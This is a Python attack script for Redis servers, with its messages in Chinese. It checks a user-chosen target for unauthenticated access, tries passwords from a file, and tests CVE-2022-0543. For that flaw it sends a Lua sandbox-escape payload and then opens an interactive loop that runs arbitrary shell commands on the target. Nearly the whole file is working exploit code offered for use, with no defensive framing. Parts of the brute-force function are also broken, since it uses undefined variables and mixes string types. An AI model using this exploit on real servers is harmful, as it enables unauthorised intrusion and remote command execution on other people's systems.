import socket
import redis

def _4unacc(ip, port, timeout):

    socket.setdefaulttimeout(timeout)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send('INFO\r\n'.encode())
    result = s.recv(1024)
    try:
        if "redis_version".encode() in result:
            print('\033[1;31m[+] Target: {0}:{1}  存在redis未授权访问漏洞\033[0m'.format(ip, port))
            weakpwd(result)
        else:
            print('\033[1;32m[-] Target: {0}:{1}  不存在redis未授权访问漏洞\033[0m'.format(ip, port))
    except Exception:
        print('\033[1;32m[-] Target: {0}:{1}  不存在redis未授权访问漏洞\033[0m'.format(ip, port))

def weakpwd(result):
    try:
        if "Authentication" in result:
            with open('pass.txt','r') as p:
                passwds = p.readlines()
                for passwd in passwds:
                    passwd = passwd.strip("\n")
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, int(port)))
                    s.send("AUTH %s\r\n".encode() %(passwd))
                    result = s.recv(1024)
                    if 'OK' in result:
                        return u"[+] IP:{0} 存在弱口令，密码：{1}".format(ip,passwd)
                    else:pass
        else:pass
        s.close()
    except Exception:
        return

def CVE_2022_0543(ip, port):

    try:
        lua = 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res'
        r = redis.Redis(host = ip,port = port)
        script = r.eval(lua,0)
        if script is not None:
            print('\033[1;31m[+] Target: {0}:{1}  存在redis lua脚本执行漏洞\033[0m'.format(ip, port))
            exp = input("是否利用漏洞CVE-2022-0543 [y/n]:\n>>")
            if exp == 'y':
                CVE_2022_0543_exp(ip,port)
            elif exp == 'n':
                quit()
        else:
            print('\033[1;32m[-] Target: {0}:{1}  不存在redis lua脚本执行漏洞\033[0m'.format(ip, port))
    except Exception:
        print('\033[1;32m[-] Target: {0}:{1}  不存在redis lua脚本执行漏洞\033[0m'.format(ip, port))

def CVE_2022_0543_exp(ip,port):
    while True:
        cmd = input("输入命令:(q->exit)\n>>")
        if cmd == "q" or cmd == "exit":
            quit()
        lua= 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("'+cmd+'", "r"); local res = f:read("*a"); f:close(); return res'
        r  =  redis.Redis(host = ip,port = port)
        script = r.eval(lua,0).decode('utf-8')
        print(script)


if __name__ == '__main__':

    ip = input("输入目标IP:\n>>")
    port = input("输入目标端口:\n>>")
    if True:
        _4unacc(ip,port,timeout=10)
        CVE_2022_0543(ip,port)
